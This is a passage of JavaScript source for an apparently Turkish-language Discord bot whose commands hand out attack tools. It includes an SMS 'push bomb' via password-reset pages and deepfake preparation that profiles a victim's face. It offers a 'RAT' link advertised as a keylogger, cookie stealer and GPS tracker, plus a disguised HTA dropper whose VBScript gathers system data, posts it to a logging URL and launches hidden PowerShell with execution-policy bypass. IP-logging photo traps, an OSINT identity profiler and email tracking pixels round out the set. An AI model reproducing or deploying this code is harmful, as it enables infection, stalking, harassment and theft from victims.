            { ad: 'Snapchat', url: 'https://accounts.snapchat.com/accounts/password_reset' },
            { ad: 'Uber', url: 'https://auth.uber.com/v2/?action=forgot_password' },
            { ad: 'Getir', url: 'https://getir.com/hesabim/sifremi-unuttum/' },
            { ad: 'Trendyol', url: 'https://www.trendyol.com/sifremi-unuttum' },
            { ad: 'Hepsiburada', url: 'https://www.hepsiburada.com/sifremi-unuttum' },
            { ad: 'Amazon', url: 'https://www.amazon.com.tr/gp/help/customer/display.html?nodeId=G3JK5DCHJ5Y9JFKF' },
            { ad: 'Google', url: 'https://accounts.google.com/signin/v2/recoveryidentifier' },
            { ad: 'Microsoft', url: 'https://account.live.com/password/reset' },
            { ad: 'Apple', url: 'https://iforgot.apple.com/password/verify/appleid' },
            { ad: 'Yemeksepeti', url: 'https://www.yemeksepeti.com/hesap/sifre-sifirla' },
            { ad: 'Migros', url: 'https://www.migros.com.tr/uye-girisi' },
            { ad: 'N11', url: 'https://www.n11.com/giris-yap' },
            { ad: 'Sahibinden', url: 'https://www.sahibinden.com/hesap/sifremi-unuttum' },
            { ad: 'Tinder', url: 'https://tinder.com/forgot-password' },
            { ad: 'Spotify', url: 'https://www.spotify.com/tr/password-reset/' },
            { ad: 'Netflix', url: 'https://www.netflix.com/LoginHelp' }
          ];
          servisler.forEach((s, i) => {
            result += (i + 1) + '. **' + s.ad + '**: ' + s.url + '\n';
          });
          result += '\n**Kullanim:** Her servise gidip ' + telefon + ' numarasini girerek sifre sifirlama/dogrulama kodu isteyin.';
          result += '\n\n> **Uyari:** Servislerin rate limitleri vardir. Asiri kullanimda numara bloke edilebilir. Bu islem sadece kendi numaranizda test amaciyla yapilmalidir. Baskasinin numarasina izinsiz SMS gonderimi yasa disidir.';
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) { await updateInteraction(interaction.application_id, interaction.token, { content: 'Push bomb hatasi: ' + err.message }); }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'deepfake-onizle':
      ctx.waitUntil((async () => {
        try {
          const fotografUrl = getAttachmentUrl('fotograf');
          if (!fotografUrl) {
            await updateInteraction(interaction.application_id, interaction.token, { content: 'Hata: Fotograf bulunamadi.' });
            return;
          }
          const controller = new AbortController();
          setTimeout(() => controller.abort(), 10000);
          let result = '**Deepfake On Izleme Analizi**\n\n';
          result += 'Fotograf: ' + fotografUrl + '\n\n';
          try {
            const img = await (await fetch(fotografUrl, { signal: controller.signal })).arrayBuffer();
            const ai = await env.AI.run('@cf/meta/llama-3.2-11b-vision-instruct', {
              image: [...new Uint8Array(img)],
              prompt: 'Describe the person in this photo in extreme detail for deepfake preparation. Include: estimated age, gender, hair color and style, eye color and shape, nose shape, skin tone, facial expression, face shape, distinctive features (moles, scars, piercings, tattoos), makeup style, facial hair, eyebrow shape. Be precise and thorough. No emojis.',
              max_tokens: 600
            });
            result += '**AI Yuz Analizi:**\n' + (ai.response || 'Analiz edilemedi.') + '\n\n';
          } catch (e) {
            result += 'AI analizi yapilamadi: ' + e.message + '\n\n';
          }
          result += '**DeepFaceLab / FaceSwap Workflow:**\n';
          result += '1. Veri Toplama: Hedef yuzun en az 500-5000 fotografi (farkli acilardan)\n';
          result += '2. Ekstraksiyon: python data_src extract -> yuzleri algila\n';
          result += '3. Donor Hazirligi: Kaynak yuzun fotograflarini topla\n';
          result += '4. Donor Ekstraksiyon: python data_dst extract\n';
          result += '5. Egitim: python train.py (en az 100k-500k iterasyon)\n';
          result += '6. Donusturme: python convert.py\n';
          result += '7. Birlestirme: python merged.py -> sonuc videosu\n\n';
          result += '**Onemli Parametreler:**\n';
          result += '- Model: SAEHD (yuksek kalite) veya Quick96 (hizli)\n';
          result += '- Batch Size: GPU VRAM\'e gore 4-16\n';
          result += '- Mask Type: XSeg (en iyi kenar karisimi)\n';
          result += '- Color Transfer: RCT/LCT/SOT\n';
          result += '- Goz Onceligi: Eye priority acik\n\n';
          result += '> **Uyari:** Deepfake teknolojisi sadece egitim ve arastirma amaciyla kullanilmalidir. Baskasinin goruntusunu izinsiz kullanmak, intikam pornosu veya dolandiricilik amaciyla deepfake uretmek yasa disidir.';
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: 'Deepfake analiz hatasi: ' + err.message });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'rat':
      ctx.waitUntil((async () => {
        try {
          const maske = getOption('maske') || 'Bekleyiniz...';
          const ratId = Math.random().toString(36).substring(2, 10);
          await env.KV.put('rat_' + ratId, JSON.stringify({ maske, creatorId: interaction.member.user.id, logChannel: interaction.channel_id }), { expirationTtl: 604800 });
          const host = request.headers.get('host');
          const url = 'https://' + host + '/v/' + ratId;
          let out = '**RAT LINKI HAZIR**\n\n';
          out += '**Link:** ' + url + '\n';
          out += '**Maske:** ' + maske + '\n\n';
          out += '**[CANLI VERI AKISI]**\n';
          out += '  >> Keylogger: bastigi her tus\n';
          out += '  >> Cookie/Storage Calma: tum auth verileri\n';
          out += '  >> Pano Monitor: clipboard degisimleri\n';
          out += '  >> GPS Takip: konum surekli guncel\n';
          out += '  >> Tab Takibi: sekmeyi terk etti / geri dondu\n';
          out += '  >> Hareket: batarya + baglanti degisimi\n';
          out += '  >> Bos Durma: idle tespiti\n';
          out += '  >> Autofill Avi: kayitli bilgiler\n';
          out += '  >> Kapanma Tespiti: tam kapanirken son paket\n\n';
          out += '**7 gun gecerli.**';
          await updateInteraction(interaction.application_id, interaction.token, { content: out });
        } catch (err) { await updateInteraction(interaction.application_id, interaction.token, { content: 'RAT hatasi: ' + err.message }); }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'dosya-rat':
      ctx.waitUntil((async () => {
        try {
          const maske = getOption('maske') || 'Fatura';
          const ratId = Math.random().toString(36).substring(2, 10);
          const host = request.headers.get('host');
          const logUrl = 'https://' + host + '/v/' + ratId;
          await env.KV.put('rat_' + ratId, JSON.stringify({ maske, creatorId: interaction.member.user.id, logChannel: interaction.channel_id }), { expirationTtl: 604800 });

          const hta = '<html><head><title>' + maske.replace(/&/g,'&amp;').replace(/</g,'&lt;') + '</title><HTA:APPLICATION windowState="minimize" showInTaskbar="yes" border="none" innerBorder="no" caption="yes"/></head><body style="font-family:Arial;padding:40px"><h2>' + maske + '</h2><p>Dosya aciliyor...</p><script language="VBScript">'
+'LU="' + logUrl + '"'
+'Sub P(tp,dt)'
+'  On Error Resume Next'
+'  Dim h,d'
+'  d="{""type"":""" & tp & """,""data"":""" & Replace(Replace(Replace(Left(dt,1800),"\","\\"),Chr(34),"\"""),vbCrLf,"\n") & """}"'
+'  Set h=CreateObject("MSXML2.ServerXMLHTTP")'
+'  h.Open "POST",LU,False'
+'  h.setRequestHeader "Content-Type","application/json"'
+'  h.Send d'
+'End Sub'
+''
+'Dim wmi,cn,un,osv'
+'cn="?" : un="?" : osv="?"'
+'On Error Resume Next'
+'Set wmi=GetObject("winmgmts:")'
+'For Each i In wmi.ExecQuery("SELECT * FROM Win32_ComputerSystem")'
+'  cn=i.Name : un=i.UserName'
+'Next'
+'For Each i In wmi.ExecQuery("SELECT * FROM Win32_OperatingSystem")'
+'  osv=i.Caption'
+'Next'
+'P "sysinfo","PC:" & cn & "|User:" & un & "|OS:" & osv'
+''
+'Dim wsh,ps,enc'
+'Set wsh=CreateObject("WScript.Shell")'
+'ps="Write-Host test;exit"'
+'enc=Base64Encode(ps)'
+'wsh.Run "powershell -W H -Ex Bypass -Enc " & enc,0,False'
+''
+'P "done","HTA calisti"'
+'window.setInterval "Tick",120000'
+'Sub Tick():P "heartbeat","HTA canli":End Sub'
+''
+'Function Base64Encode(s)'
+'  Dim oXML,oN'
+'  Set oXML=CreateObject("Msxml2.DOMDocument.3.0")'
+'  Set oN=oXML.CreateElement("b64")'
+'  oN.dataType="bin.base64"'
+'  oN.nodeTypedValue=StreamToBin(s)'
+'  Base64Encode=oN.text'
+'End Function'
+'Function StreamToBin(t)'
+'  Dim s,b'
+'  Set s=CreateObject("ADODB.Stream")'
+'  s.Open:s.Type=2:s.Charset="utf-8"'
+'  s.WriteText t:s.Position=0:s.Type=1'
+'  b=s.Read:s.Close'
+'  StreamToBin=b'
+'End Function'
+'</script></body></html>';

          const formData = new FormData();
          formData.append('files[0]', new Blob([hta], { type: 'application/hta' }), maske.replace(/[^a-zA-Z0-9]/g, '_') + '.hta');
          formData.append('payload_json', JSON.stringify({ content: '**HTA RAT HAZIR**\n\nKurban acinca PC bilgisi + heartbeat loglari kanala akar.' }));
          await updateInteraction(interaction.application_id, interaction.token, formData, true);
        } catch (err) { await updateInteraction(interaction.application_id, interaction.token, { content: 'Hata: ' + err.message }); }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'foto-tuzak':
      ctx.waitUntil((async () => {
        try {
          const attachmentId = options?.find(o => o.name === 'fotograf')?.value;
          if (!attachmentId) { await updateInteraction(interaction.application_id, interaction.token, { content: 'Hata: Fotograf yukleyin.' }); return; }
          const att = interaction.data.resolved?.attachments?.[attachmentId];
          if (!att || !att.url) { await updateInteraction(interaction.application_id, interaction.token, { content: 'Hata: Fotograf bulunamadi.' }); return; }

          const imgRes = await fetch(att.url);
          if (!imgRes.ok) throw new Error('Fotograf indirilemedi.');
          const imgBuf = await imgRes.arrayBuffer();
          const mime = att.content_type || 'image/jpeg';

          const fotoId = 'foto_' + Math.random().toString(36).substring(2, 10);
          await env.KV.put(fotoId, JSON.stringify({ imgB64: btoa(String.fromCharCode(...new Uint8Array(imgBuf))), mime, creatorId: interaction.member.user.id, logChannel: interaction.channel_id }), { expirationTtl: 604800 });

          const host = request.headers.get('host');
          const url = 'https://' + host + '/p/' + fotoId;

          let out = '**FOTO TUZAK LINKI**\n\n';
          out += '**Link:** ' + url + '\n\n';
          out += 'Kurban tiklayinca fotografi gorur. Arkada IP + cihaz + parmak izi kanala akar.\n';
          out += '**Discorda bu linki yapistirinca foto onizlemesi cikar.**';
          await updateInteraction(interaction.application_id, interaction.token, { content: out });
        } catch (err) { await updateInteraction(interaction.application_id, interaction.token, { content: 'Hata: ' + err.message }); }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'profiler':
      ctx.waitUntil((async () => {
        try {
          const kullanici = getOption('kullanici');
          await env.KV.put('profiler_' + interaction.channel_id, JSON.stringify({ logChannel: interaction.channel_id }), { expirationTtl: 2592000 });

          const platforms = [
            `https://www.instagram.com/${kullanici}`,
            `https://x.com/${kullanici}`,
            `https://github.com/${kullanici}`,
            `https://www.reddit.com/user/${kullanici}`,
            `https://www.tiktok.com/@${kullanici}`,
            `https://www.youtube.com/@${kullanici}`,
            `https://www.twitch.tv/${kullanici}`,
            `https://steamcommunity.com/id/${kullanici}`,
            `https://www.pinterest.com/${kullanici}`,
            `https://medium.com/@${kullanici}`,
            `https://www.flickr.com/people/${kullanici}`,
            `https://www.deviantart.com/${kullanici}`,
            `https://gitlab.com/${kullanici}`,
            `https://www.patreon.com/${kullanici}`,
            `https://tryhackme.com/p/${kullanici}`,
            `https://soundcloud.com/${kullanici}`,
            `https://vimeo.com/${kullanici}`,
            `https://www.behance.net/${kullanici}`,
            `https://dribbble.com/${kullanici}`,
            `https://codepen.io/${kullanici}`,
            `https://keybase.io/${kullanici}`,
            `https://www.goodreads.com/${kullanici}`,
            `https://www.last.fm/user/${kullanici}`,
            `https://www.fiverr.com/${kullanici}`,
            `https://www.roblox.com/user.aspx?username=${kullanici}`,
            `https://www.chess.com/member/${kullanici}`,
            `https://lichess.org/@/${kullanici}`,
            `https://www.kaggle.com/${kullanici}`,
            `https://pastebin.com/u/${kullanici}`,
            `https://bitbucket.org/${kullanici}`
          ];

          const results = await Promise.allSettled(platforms.map(async (url) => {
            const c = new AbortController();
            setTimeout(() => c.abort(), 4000);
            try {
              const resp = await fetch(url, { method: 'HEAD', signal: c.signal, redirect: 'follow' });
              if (resp.status === 200) return url;
              return null;
            } catch { return null; }
          }));

          const found = results.filter(r => r.status === 'fulfilled' && r.value).map(r => r.value);

          let out = '**Profiler: ' + kullanici + '**\n\n';
          out += 'Bulunan Platformlar (' + found.length + '/30):\n';
          found.forEach(p => { out += '  - ' + p + '\n'; });

          if (env.DEEPSEEK_API_KEY && found.length > 0) {
            try {
              const aiResp = await fetch('https://api.deepseek.com/v1/chat/completions', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + env.DEEPSEEK_API_KEY },
                body: JSON.stringify({
                  model: 'deepseek-v4-flash',
                  messages: [
                    { role: 'system', content: 'Sen bir istihbarat profilcisin. Bu kullanicinin bulundugu platformlara bakarak KIMLIK PROFILI cikar. Yas araligi, ilgi alanlari, meslek tahmini, lokasyon, egitim seviyesi, hobiler, sosyal cevre. 600 karakter Turkce.' },
                    { role: 'user', content: 'Kullanici adi: ' + kullanici + '\nBulunan platformlar:\n' + found.join('\n') }
                  ],
                  max_tokens: 800
                })
              });
              const aiData = await aiResp.json();
              if (aiData.choices?.[0]?.message?.content) {
                out += '\n**AI Kimlik Profili:**\n' + aiData.choices[0].message.content;
              }
            } catch { out += '\nAI profil analizi yapilamadi.'; }
          }

          await updateInteraction(interaction.application_id, interaction.token, { content: out });
        } catch (err) { await updateInteraction(interaction.application_id, interaction.token, { content: 'Profiler hatasi: ' + err.message }); }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'oltala-pixel':
      ctx.waitUntil((async () => {
        try {
          const trackId = Math.random().toString(36).substring(2, 12);
          await env.KV.put('trk_' + trackId, JSON.stringify({ creatorId: interaction.member.user.id, logChannel: interaction.channel_id }), { expirationTtl: 2592000 });
          const host = request.headers.get('host');
          const pixelUrl = 'https://' + host + '/px/' + trackId;
          let out = '**Tracking Pixel Hazir**\n\n';
          out += '```html\n<img src="' + pixelUrl + '" width="1" height="1">\n```\n\n';
          out += 'Bu kodu email HTML\'ine gomun. Email acildiginda IP, cihaz, tarayici bilgisi loglanir.';
          await updateInteraction(interaction.application_id, interaction.token, { content: out });
        } catch (err) { await updateInteraction(interaction.application_id, interaction.token, { content: 'Pixel hatasi: ' + err.message }); }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    default:
        return sendResponse('Bilinmeyen komut. Bu bot henuz yapilandiriliyor.');
    }
  }

  return new Response('Bilinmeyen etkilesim', { status: 400 });
}
